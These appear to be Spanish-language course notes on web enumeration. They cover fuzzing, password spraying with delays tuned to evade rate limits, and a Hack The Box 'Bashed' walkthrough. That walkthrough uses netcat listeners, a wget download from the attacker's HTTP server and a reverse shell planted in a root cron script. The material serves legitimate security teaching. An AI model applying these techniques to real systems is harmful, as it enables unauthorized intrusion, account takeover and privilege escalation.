

> [!info] Relacionado con
> [[Apuntes/05 - Auditoria Web/EnumeraciÃ³n Web]] Â· [[Fuzzing Web con ffuf]] Â· [[Burp Suite - Framework de AuditorÃ­a]] Â· [[Nmap - Escaneo y EnumeraciÃ³n]]
> â†’

---

## â‘  AnatomÃ­a de una URL

Cada parte de la URL es un punto donde podemos **fuzzear**: subdominio, directorio, nombre de parÃ¡metro o valor de variable.

```
https://ejemplo.es/directorio?q=valor&page=2
 â”‚ â”‚ â”‚ â”‚ â”‚ â”‚
 â”‚ â”‚ â”‚ â”‚ â”‚ â””â”€ 2Âª variable (page) = valor (2)
 â”‚ â”‚ â”‚ â”‚ â””â”€ separador de parÃ¡metros: &
 â”‚ â”‚ â”‚ â””â”€ variable (q) = valor
 â”‚ â”‚ â””â”€ directorio / ruta
 â”‚ â””â”€ dominio (.es = EspaÃ±a, .com = global, .mx = MÃ©xico...)
 â””â”€ protocolo (http, https, ftp, ssh, smb...) + 's' = capa segura sobre TCP/IP
```

| Componente | Detalle |
|------------|---------|
| **Protocolo** | CÃ³mo se accede al recurso. La `s` de HTTPS es el subprotocolo seguro sobre TCP/IP |
| **Dominio** | Termina en un TLD que indica procedencia (`.es`, `.com`, `.mx`...) |
| **ParÃ¡metro** | Tras `?` empieza el primer parÃ¡metro; `variable=valor` |
| **Encadenamiento** | Para varios parÃ¡metros se usa `&` (ampersand). El `?` va **una sola vez**: `pagina?param1=valor1&param2=valor2` |

> [!important] Por quÃ© importa esta anatomÃ­a
> Saber diferenciar las partes de una URL es lo que permite decidir **dÃ³nde inyectar el diccionario** en fuzzing.

---

## â‘¡ Endpoint: la pieza clave

Un **endpoint** es el receptor concreto de una peticiÃ³n. Este concepto es la clave para entender por quÃ© unas tÃ©cnicas se detectan y otras no:

| AcciÃ³n | Resultado |
|--------|-----------|
| Cambiar el **valor** de una variable en el mismo directorio | **Mismo endpoint** (se repite el receptor) |
| Cambiar de **directorio, parÃ¡metro o usuario** | **Endpoints distintos** (cada uno es un receptor diferente) |

> [!tip] AnalogÃ­a
> Imagina la clase con 35 alumnos. Preguntar Â«Â¿me dejas un euro?Â» a Mariana, a Chema, a Ã“scar... son **endpoints distintos** (personas distintas). Repetir Â«Â¿un euro? Â¿un euro? Â¿un euro?Â» a la **misma** persona es el mismo endpoint, y a la dÃ©cima te cansa (te bloquea).

---

## â‘¢ CÃ³digos de estado HTTP

Al lanzar peticiones interpretamos la respuesta por su cÃ³digo:

| CÃ³digo | Significado | Uso en enumeraciÃ³n |
|--------|-------------|-------------------|
| **200** | OK â€” el recurso existe y responde | El directorio/recurso **estÃ¡** (levantado) |
| **403** | Forbidden â€” existe pero no autorizado | Existe, pero no nos deja entrar |
| **404** | Not Found â€” no existe | El recurso **no** estÃ¡ |
| **301/302** | RedirecciÃ³n | Nos manda a otra ruta (ej. `/js` â†’ `/js/`) |

> [!tip] Chuleta visual
> [http.cat](https://http.cat) tiene todos los cÃ³digos de estado HTTP con imÃ¡genes.

---

## â‘£ Fuerza bruta vs Password spraying vs EnumeraciÃ³n de directorios

Todas Â«lanzan muchas peticionesÂ», pero se comportan de forma muy distinta frente a los mecanismos de defensa.

### Fuerza bruta

- Se lanza contra **el mismo endpoint** (por ejemplo, `wp-login.php?user=x&pass=?`), iterando el **valor** de una variable.
- Al golpear siempre el mismo receptor, es fÃ¡cil que salte el **rate limit** y nos bloqueen.
- Es **exponencial**: no sabemos la longitud ni el juego de caracteres, asÃ­ que el coste crece muchÃ­simo.

> [!warning] Regla de oro
> La **fuerza bruta es lo Ãºltimo** que hay que intentar. Es ruidosa, lenta y muy probablemente no encuentre la contraseÃ±a por caracteres especiales, longitud y aleatoriedad.

### Password spraying

En lugar de probar muchas contraseÃ±as contra un usuario, se prueba **una misma contraseÃ±a contra muchos usuarios** (cada usuario es un endpoint distinto). Cuando termina la tanda, se lanza la siguiente contraseÃ±a.

- Explota el factor humano: la contraseÃ±a mÃ¡s habitual suele ser **el nombre de la empresa + aÃ±o** (`Empresa2026`, `Empresa2026!`, `Empresa2025`...).
- Al rotar entre usuarios, cuando se vuelve al primero ya ha pasado tiempo suficiente para no disparar el rate limit por usuario.
- Al contrario que la fuerza bruta, **es de las primeras cosas** que se prueban en un ejercicio real.

> [!danger] Solo en entornos autorizados
> Sobre un directorio activo de ~700 usuarios se lanza `Empresa2026` a todos; luego `Empresa2026!`; luego `Empresa2025` y `Empresa2025!`. Ese pequeÃ±o conjunto de combinaciones suele sacar un porcentaje notable de usuarios. **Solo aplicable en entornos autorizados.**

### EnumeraciÃ³n de directorios (Â¿por quÃ© NO te banean?)

Al descubrir directorios probamos `/admin`, `/login`, `/uploads`... es decir, **un endpoint distinto por cada peticiÃ³n**. El servidor solo ve trÃ¡fico repartido entre muchas rutas, que es un comportamiento normal de navegaciÃ³n.

```
Fuerza bruta â†’ MISMO endpoint (mismo login) â†’ salta rate limit
Password spraying â†’ 1 pass a N usuarios (endpoints distintos) â†’ evade rate limit
Enum. directorios â†’ N rutas distintas (N endpoints) â†’ no salta rate limit
```

> [!tip] Matiz sobre parÃ¡metros
> Si sobre el mismo directorio **iteras el valor** de una variable, es fuerza bruta (mismo endpoint). Si **iteras el nombre del parÃ¡metro o el directorio**, son endpoints distintos â†’ se comporta como un spray. Por eso podemos enumerar parÃ¡metros ocultos sin bloqueos.

---

## â‘¤ Rate limit, WAF y cÃ¡lculo de delays

El **rate limit** es el nÃºmero mÃ¡ximo de intentos permitidos por unidad de tiempo. Siempre tiene forma de `nÂº de intentos / tiempo`.

- Valor tÃ­pico en web y en Active Directory: **3 intentos cada 5 minutos** (â‰ˆ 1 intento cada 100 s â‰ˆ 1,5 min).
- Puede aplicarse por **usuario** (bloquea la cuenta) o por **IP** (nÃºmero de requests que acepta un servidor).
- Un **WAF/SIEM/EDR** detecta patrones de comportamiento repetitivo y levanta *flags* que acaban en bloqueo.

### CÃ³mo calcular el delay (con NetExec)

**NetExec lanza ~1 peticiÃ³n cada 0,5 s**. Con ese dato se estima cuÃ¡nto tarda una vuelta completa:

| Escenario | CÃ¡lculo | Resultado |
|-----------|---------|-----------|
| **~5000 usuarios** | 5000 Ã— 0,5 s = 2500 s â‰ˆ 40 min | Al volver al primer usuario ya ha pasado >1 hora â†’ **no hace falta delay** |
| **Pocos usuarios (ej. 6)** | 6 Ã— 0,5 s = 3 s por vuelta | Demasiado rÃ¡pido â†’ hay que **meter un delay** (~1 min por peticiÃ³n) |

> [!tip] Regla mental
> Cuantos **menos usuarios**, **mÃ¡s delay**; cuantos mÃ¡s usuarios, el propio recorrido ya introduce el tiempo necesario.

### Tiempos de crackeo de contraseÃ±as

El coste es **acumulativo**: antes de llegar a probar 14 caracteres, ya has tenido que agotar todas las de 13, 12, 11...

> [!warning] Por quÃ© la fuerza bruta Â«estÃ¡ raraÂ»
> Una contraseÃ±a de ~14 caracteres alfanumÃ©ricos con sÃ­mbolos puede irse a cientos de millones de aÃ±os. Y para llegar ahÃ­ primero recorres todas las longitudes menores. Por eso conviene evitarla y priorizar spraying o vectores mÃ¡s inteligentes.

---

## â‘¥ La tÃ©cnica estrella: Fuzzing

El **fuzzing** combina lo mejor de la fuerza bruta (probar muchas combinaciones de un diccionario) con lo mejor del listado de directorios (endpoints distintos, sin bloqueos). Su clave es el marcador **FUZZ**: donde lo colocamos, la herramienta sustituye cada entrada del diccionario.

```
# El marcador FUZZ se puede colocar en distintas posiciones:

https://FUZZ.dominio.es/ â†’ descubrir SUBDOMINIOS
https://dominio.es/FUZZ â†’ descubrir DIRECTORIOS
https://dominio.es/admin/FUZZ.php â†’ descubrir FICHEROS/rutas
https://dominio.es/pagina?FUZZ=1 â†’ descubrir NOMBRES de parÃ¡metros
https://dominio.es/pagina?id=FUZZ â†’ descubrir VALORES de una variable
```

> [!tip] Ventaja del fuzzing
> Con **una sola herramienta** y el mismo enfoque podemos descubrir subdominios, directorios, parÃ¡metros y valores. Colocamos FUZZ donde queramos: esa flexibilidad es lo mÃ¡s importante de la tÃ©cnica.

> [!info] Herramienta destacada: x8
> **x8** es una herramienta especializada en **enumerar parÃ¡metros ocultos** de una web (parÃ¡metros que no aparecen en la interfaz pero el backend sÃ­ procesa).

### Â¿CuÃ¡ndo listar directorios y cuÃ¡ndo fuzzear?

| SituaciÃ³n | AcciÃ³n |
|-----------|--------|
| **Por defecto** | Listado de directorios de confianza (dirsearch). Es lo primero que se lanza |
| **No encuentras nada** con el listado estÃ¡ndar | **Fuzzear**: sospechas que hay algo oculto (subdominio, parÃ¡metro, funcionalidad) |
| **Probar el valor** de una variable | Fuzzing sin recurrir al Intruder de Burp Suite |

> [!tip] TÃ­pico en CTFs
> En mÃ¡quinas vulnerables/CTFs casi siempre hace falta fuzzear porque el diccionario estÃ¡ndar no cubre rutas especÃ­ficas de la mÃ¡quina.

---

## â‘¦ MetodologÃ­a de pentesting y reconocimiento web

Toda la enumeraciÃ³n web se enmarca en la metodologÃ­a por fases:

```
1. EnumeraciÃ³n â†’ 2. ExplotaciÃ³n â†’ 3. Escalada de privilegios â†’ 4. Persistencia â†’ 5. Reporte
```

Camino habitual dentro de la enumeraciÃ³n web:

1. **Nmap** para detectar servicios. Si hay 80/443 o cualquier HTTP â†’ **listado de directorios**.
2. Si es un **CMS**: WordPress â†’ WPScan; Drupal â†’ droopescan.
3. Mientras el listado corre en segundo plano, **conocer la web** (recon manual).

### La analogÃ­a de la discoteca (reconocimiento web)

Antes de explotar, hay que Â«conocerÂ» la aplicaciÃ³n. El **WAF es el portero**: si te pasas de pesado, te echa. La idea es seducir sin que el portero te frene.

| SeÃ±al encontrada en la web | Vulnerabilidad potencial a investigar |
|---------------------------|--------------------------------------|
| Buscador / campo de bÃºsqueda | [[OWASP Top 10 - CVE CVSS CWE|SQL Injection]] (interactÃºa con BD) |
| Formulario de registro o de contacto | SQL Injection (comunicaciÃ³n con el backend) |
| Blog / foro / comentarios | Cross-Site Scripting (XSS) |
| Directorio `/uploads` o de subida de ficheros | Subida de ficheros â†’ posible ejecuciÃ³n (webshell) |
| Descarga de PDF (polÃ­ticas, etc.) | XXE (XML External Entity) |
| No hace fetch de origen | SSRF (Server-Side Request Forgery) |
| VersiÃ³n de PHP / software muy antigua | CVE con exploit pÃºblico |
| Plantilla HTML / CMS con versiÃ³n antigua | Vulnerabilidades propias de la plantilla/CMS |

â†’

â†’

> [!tip] Buena prÃ¡ctica de notas
> Todo hallazgo (usuario potencial, versiÃ³n, ruta interesante, tecnologÃ­a) se **apunta en el bloc de notas** aunque de momento se descarte. En enumeraciÃ³n, cuanto mÃ¡s recopilas, mÃ¡s vectores tienes despuÃ©s.

---

## â‘§ Caso prÃ¡ctico: mÃ¡quina Bashed (Hack The Box)

> [!info] Entorno autorizado
> Todo el trabajo es en un **entorno autorizado de CTF**. La mÃ¡quina Bashed de Hack The Box.

### EnumeraciÃ³n inicial

```bash
ping -c1 <IP> # comprobar ICMP / que la mÃ¡quina responde
nmap -sCV -Pn <IP> # -Pn omite descubrimiento de host (no depende de ICMP)
```

> [!tip] Detalle sobre ICMP/ARP
> En mÃ¡quinas alojadas en AWS un ping no devuelve nada porque **no hay ICMP ni ARP**. AhÃ­ se usa `-Pn` para que Nmap no descarte el host.

- Si al abrir la web **carga**, no hay un DNS/vhost puesto a mano. Si **no carga** y da error, hay que encontrar el nombre y aÃ±adirlo a `/etc/hosts`.
- Con un puerto 80 abierto, se lanza el listado de directorios en segundo plano (**dirsearch**) mientras se hace el recon manual.

### IdentificaciÃ³n de tecnologÃ­as

- Con **Wappalyzer** se identifica el stack: se detecta **Apache** y **PHP** en el servidor.
- Se anota la versiÃ³n de Apache para buscar **CVEs** (se revisaron varias: WebDAV, mod_proxy FTP XSS, buffer/heap overflow, modo LDAP...) y se descartan las que no aplican.
- TambiÃ©n aparece **jQuery** marcado como vulnerable â€” en la prÃ¡ctica casi nunca es un vector real.

### Reconocimiento manual y descubrimiento de rutas

| Ruta / hallazgo | ObservaciÃ³n |
|----------------|-------------|
| `/about.html` | PÃ¡gina Â«AboutÂ». Aparece un autor â†’ **usuario potencial** |
| `/config.php` | 0 bytes. Un `.php` se **ejecuta** en el navegador, no muestra el cÃ³digo fuente |
| `/contact.html` | Formulario sin backend real (comprobaciÃ³n solo en el front). Con Burp podrÃ­a saltarse |
| `/images`, `/js`, `/php` | Directorios de recursos. `/js` y `/php` ejecutan PHP â†’ interesantes para subir/ejecutar |
| `/uploads` | Directorio de subida â†’ si logramos subir algo, posible **ejecuciÃ³n** |
| `/dev` | Directorio de desarrollo â†’ aquÃ­ estÃ¡ la joya |
| Enlace a GitHub en el cÃ³digo | Apunta al **cÃ³digo fuente** de la herramienta instalada en el servidor |

> [!info] Por quÃ© un `.php` se ve Â«vacÃ­oÂ»
> Un `.html` o `.js` muestra su texto en el navegador. Un `.php` **se ejecuta** en el servidor y solo vemos el **resultado** de esa ejecuciÃ³n, no el cÃ³digo.

> [!info] La extensiÃ³n del directorio no limita el intÃ©rprete
> Un fichero PHP subido a `/js` **tambiÃ©n se ejecuta** como PHP: el nombre de la carpeta no define quÃ© se interpreta. Si el servidor tiene PHP (Apache sobre Linux), ejecutarÃ¡ el `.php` estÃ© donde estÃ©.

### ExplotaciÃ³n: webshell â†’ reverse shell (www-data)

En `/dev` se encuentra `phpbash.php`, una **webshell** que da ejecuciÃ³n de comandos sin autenticaciÃ³n (RCE crÃ­tico).

```bash
# En la webshell:
whoami # -> www-data
ls # /var/www/html es la raÃ­z por defecto de Apache
```

Como una webshell es incÃ³moda, se monta una **reverse shell** propia. Usando revshells.com se genera un payload (Python) y se pone un *listener* con Netcat:

```bash
# En la mÃ¡quina atacante (Kali):
nc -lvnp 4444

# En la webshell se pega el payload de reverse shell (Python) apuntando a nuestra IP:puerto.
```

> [!success] Compromiso inicial
> Se obtiene una **reverse shell como `www-data`** en unos minutos.

### Escalada de privilegios: www-data â†’ script_manager

```bash
sudo -l
# Resultado: www-data puede ejecutar comandos como 'scriptmanager' SIN contraseÃ±a.

sudo -u scriptmanager -i # nos convertimos en scriptmanager (-i = shell interactiva)
```

> [!tip] Buena prÃ¡ctica al cambiar de usuario
> `sudo -u <usuario> -i` es mÃ¡s limpio que `sudo su`. El `-i` (interactive) nos da una sesiÃ³n con entorno del usuario destino.

- En `/home` aparecen los usuarios `arrexel` (dueÃ±o de la mÃ¡quina) y `scriptmanager`.
- La primera flag (`user.txt`) se encuentra en el directorio de **arrexel**.

### Escalada final: script_manager â†’ root (cron + escritura de fichero)

En `/home/scriptmanager/scripts` hay dos ficheros clave:

| Fichero | Propietario | Nuestros permisos (como scriptmanager) |
|---------|-------------|----------------------------------------|
| `test.py` | scriptmanager | Lectura y **escritura** (es nuestro) |
| `test.txt` | root | Solo lectura |

Existe un **cron job** que ejecuta `test.py` **como root** de forma periÃ³dica. Se confirma observando que la **fecha de modificaciÃ³n** de los ficheros cambia sola.

```
cron (root) ejecuta test.py periÃ³dicamente
 â†“
test.py es propiedad de scriptmanager â†’ PODEMOS modificarlo
 â†“
Inyectamos una reverse shell dentro de test.py
 â†“
El cron ejecuta test.py como root â†’ nos conecta una shell
 â†“
Listener recibe la conexiÃ³n â†’ shell de ROOT
```

```bash
# OpciÃ³n A â€” escribir en una sola lÃ­nea con echo (Â¡todo en 1 lÃ­nea!):
echo 'import socket,subprocess,os; ...reverse shell python...' > /home/scriptmanager/scripts/test.py

# OpciÃ³n B â€” transferir el fichero preparado en local:
# En Kali (dentro de la carpeta con test.py):
python3 -m http.server 8000

# En la vÃ­ctima:
wget http://10.10.14.x:8000/test.py -O /home/scriptmanager/scripts/test.py

# Listener para recibir la shell de root:
nc -lvnp 4440
```

> [!success] Objetivo cumplido
> Al ejecutarse el cron como root sobre nuestro `test.py` modificado, el *listener* recibe una **shell de root**. MÃ¡quina comprometida por completo.

> [!danger] Errores comunes vistos en directo
> - **Puerto del listener**: hay que abrir el nc en el **mismo puerto** que el payload
> - **Comandos en una sola lÃ­nea**: en shells no interactivas, cuidado con saltos de lÃ­nea y comillas mal cerradas al usar `echo`
> - **`test.txt` vs `test.py`**: la reverse shell hay que meterla en el fichero que ejecuta el cron (`test.py`), no en el `.txt` de solo lectura

---

## â‘¨ Herramientas utilizadas en la sesiÃ³n

| Herramienta | Objetivo | Fase | Nivel | Notas |
| ------------------------------------------------------------- | ---------------------------- | ---------------- | ----------- | --------------------------------- |
| **[[Nmap]]** | Detectar puertos y servicios | EnumeraciÃ³n | Recurrente | `-Pn` si no hay ICMP (AWS) |
| **[[DirSearch]]** | Listar directorios | Enum. web | Practicada | Default del profesor, en 2Âº plano |
| **[[FFUF]]** | Fuzzing (FUZZ) | Enum. web | Introducida | FUZZ en dir/param/subdominio |
| **Gobuster / dirb / [[Feroxbuster]]** | Listar directorios | Enum. web | Practicada | Unas con recursivo, otras no |
| **x8** | Enumerar parÃ¡metros ocultos | Enum. web | Mencionada | Nueva en el registro |
| **Wappalyzer** | Fingerprint de tecnologÃ­as | Enum. web | Introducida | Detecta Apache/PHP/CMS |
| **[[WordPress - AuditorÃ­a con WPScan|WPScan]]** / droopescan | AuditorÃ­a de CMS | Enum. web | Introducida | WP y Drupal respectivamente |
| **NetExec** | Spraying/auth en AD | Enum./Acceso | Introducida | ~1 req / 0,5 s |
| **[[Burp Suite - Framework de AuditorÃ­a|Burp Suite]]** | Interceptar/saltar front | ExplotaciÃ³n | Practicada | Saltar validaciones de front |
| **revshells.com** | Generar reverse shells | ExplotaciÃ³n | Practicada | Bash/nc/Python/PHP/perl |
| **Netcat (nc)** | Listener / conexiones | ExplotaciÃ³n | Practicada | Recibir la reverse shell |
| **Python http.server** | Servir/transferir ficheros | Post-explotaciÃ³n | Introducida | Combinado con wget |

---

## â‘© Comandos importantes

```bash
# --- EnumeraciÃ³n ---
ping -c1 <IP>
nmap -sCV -Pn <IP>
dirsearch -u http://<IP>/

# --- Fuzzing (marcador FUZZ) ---
ffuf -u http://<IP>/FUZZ -w <diccionario> -c # directorios
ffuf -u http://FUZZ.<dominio> -w <diccionario> -c # subdominios

# --- ExplotaciÃ³n / shells ---
nc -lvnp 4444 # listener en Kali
whoami ; id ; ls -la # reconocimiento en la shell

# --- Escalada de privilegios ---
sudo -l # quÃ© puedo ejecutar como sudo
sudo -u scriptmanager -i # cambiar de usuario
ls -la # revisar propietarios de ficheros

# --- Transferencia de ficheros ---
python3 -m http.server 8000 # en el atacante
wget http://10.10.14.x:8000/test.py -O test.py # en la vÃ­ctima
```

---

## â‘ª Errores comunes y buenas prÃ¡cticas

> [!danger] Errores comunes
> - Confundir **fuerza bruta** (mismo endpoint) con **spraying** (endpoints distintos)
> - Lanzar fuerza bruta como primera opciÃ³n: ruidosa, lenta e improbable
> - Descuadre de **puertos** entre payload y listener
> - Meter la reverse shell en el fichero equivocado dentro de la cadena de escalada

> [!tip] Buenas prÃ¡cticas
> - Primero **listado de directorios** (dirsearch); solo si no aparece nada, **fuzzear**
> - **Conocer** la web antes de explotar (analogÃ­a de la discoteca)
> - Apuntarlo **todo** en el bloc de notas: usuarios, versiones, rutas
> - Calcular **delays** en spraying segÃºn nÂº de usuarios para no superar el rate limit

---

## â‘« ConexiÃ³n con sesiones anteriores

- El **fuzzing con `FUZZ`** y [[FFUF]] ya apareciÃ³ en la [[ExplotaciÃ³n de Servicios - Linux|explotaciÃ³n de servicios web]] (puerto 80). AquÃ­ se formaliza como tÃ©cnica y se compara con el listado de directorios.
- El **descubrimiento de subdominios** enlaza con lo visto en [[OSINT - MetodologÃ­a y Fuentes|OSINT / superficie de ataque]].
- La cadena **webshell â†’ reverse shell â†’ sudo â†’ escalada** repite el patrÃ³n de mÃ¡quinas anteriores (WordPress â†’ theme editor â†’ www-data, Mr. Robot, Oopsie/Archetype).
- La **escalada vÃ­a fichero ejecutado por root (cron)** conecta con el concepto de tareas programadas visto en la sesiÃ³n previa.
- `sudo -l`, cambio de usuario y revisiÃ³n de propietarios con `ls -la` son parte del *checklist* de [[Escalada de Privilegios]].

---

## â‘¬ Resumen final

La sesiÃ³n fija los cimientos de la **enumeraciÃ³n web**: leer una URL como quien hace un anÃ¡lisis sintÃ¡ctico, entender el concepto de **endpoint** y, a partir de ahÃ­, distinguir por quÃ© la **fuerza bruta** salta alarmas mientras el **password spraying** y la **enumeraciÃ³n de directorios** las evitan. La tÃ©cnica estrella es el **fuzzing** (marcador FUZZ en subdominio, directorio, parÃ¡metro o valor), con **x8** como utilidad especÃ­fica para parÃ¡metros ocultos. Todo se cierra con una mÃ¡quina de HTB (**Bashed**) resuelta de principio a fin: *phpbash* â†’ reverse shell como www-data â†’ sudo â†’ scriptmanager â†’ root aprovechando un cron que ejecuta un script modificable.

---

## â‘­ Checklist de repaso

- [ ] SÃ© identificar protocolo, dominio, directorio, parÃ¡metro y variable en una URL
- [ ] Explico quÃ© es un endpoint y por quÃ© es la clave de rate limit/spraying
- [ ] Diferencio fuerza bruta, password spraying y enumeraciÃ³n de directorios
- [ ] SÃ© quÃ© es el rate limit y cÃ³mo calcular un delay segÃºn el nÂº de usuarios
- [ ] Entiendo el fuzzing y sÃ© dÃ³nde colocar el marcador FUZZ
- [ ] Conozco x8 para enumerar parÃ¡metros ocultos
- [ ] Recuerdo las 5 fases de la metodologÃ­a de pentesting
- [ ] SÃ© leer las seÃ±ales del recon web (buscadorâ†’SQLi, uploadsâ†’webshell, etc.)
- [ ] Reproduzco la cadena de Bashed: phpbash â†’ www-data â†’ scriptmanager â†’ root
- [ ] SÃ© transferir ficheros con http.server + wget y montar reverse shells con nc

â†’

---

## â‘® ActualizaciÃ³n del registro de herramientas

### Herramientas nuevas incorporadas

| Herramienta | Para quÃ© sirve | Fase | Nivel |
| ------------- | ---------------------------------------------- | --------------- | ---------- |
| x8 | EnumeraciÃ³n de parÃ¡metros ocultos en web | EnumeraciÃ³n web | Mencionada |
| [[DirSearch]] | Listado de directorios (default del profesor) | EnumeraciÃ³n web | Practicada |
| revshells.com | Generador de reverse shells (recurso web) | ExplotaciÃ³n | Practicada |
| droopescan | AuditorÃ­a de CMS Drupal (equivalente a WPScan) | EnumeraciÃ³n web | Mencionada |

### Conceptos/tÃ©cnicas para el registro

- **Fuzzing** con marcador FUZZ (subdominio / directorio / parÃ¡metro / valor)
- **Password spraying** y su diferencia con fuerza bruta (endpoints)
- **CÃ¡lculo de delays** frente al rate limit (referencia: NetExec ~1 req/0,5 s)
- **Escalada por cron + fichero escribible** ejecutado como root
- Mapa de **recon web â†’ vulnerabilidad** (analogÃ­a de la discoteca)

â†’

â†’

â†’

â†’
â†’
